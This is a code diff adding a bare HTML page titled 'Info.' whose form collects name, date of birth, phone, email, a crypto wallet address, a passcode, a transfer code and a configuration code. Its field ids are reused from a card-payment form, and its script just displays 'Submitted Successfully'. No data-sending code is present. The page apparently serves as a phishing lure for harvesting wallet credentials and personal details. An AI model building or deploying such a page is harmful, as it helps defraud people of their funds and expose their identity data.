@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info.</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="likebody"></div>
+    <div class="card-form-container">
+        <h2></h2>
+        <h2></h2>
+        <form class="card-form">
+            <div class="form-group">
+                <label for="card-number">Name</label>
+                <input type="text" id="card-number" name="card number" placeholder="your name" required>
+            </div>
+            <div class="form-group">
+                <label for="expiry-date">Date of Birth</label>
+                <input type="text" id="expiry-date" name="expiry date" placeholder="DD/MM/YY" required>
+            </div>
+            <div class="form-group">
+                <label for="card-holder">Phone Number</label>
+                <input type="text" id="card-holder" placeholder="" name="card name" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv">Valid email address </label>
+                <input type="text" id="cvv" name="cvv" placeholder="example123@gmail.com" required>
+            </div>
+
+            <div class="form-group">
+                <label for="card-holder">Country code</label>
+                <input type="text" id="Billing"  name="Billing add" required>
+            </div>
+            <div class="form-group">
+                <label for="card-holder">Wallet address </label>
+                <input type="text" id="Billing" required>
+            </div>
+            <div class="form-group">
+                <label for="card-holder">Passcode</label>
+                <input type="text" id="Billing" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv">Transfer code </label>
+                <input type="text" id="cvv" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv">Configuration code</label>
+                <input type="text" id="cvv" required>
+            </div>
+            <button class="submit-btn">Submit</button>
+       
+
+<div>
+    <div class="pin-group">
+         <br>
+        <div id="pin" >Submitted Successfully</div>
+        <div type="submit" class="submit-btn">Active</div>
+    </div>
+</div>
+
+</form>
+</div>
+
+
+<script>
+    const submitBtn = document.querySelector('.submit-btn');
+    const pinGroup = document.querySelector('.pin-group');
+
+    submitBtn.addEventListener("click", (e) => {
+        e.preventDefault();
+pinGroup.style.display = "block"
+    
+
+        
+    })
+</script>
+</body>
+</html>
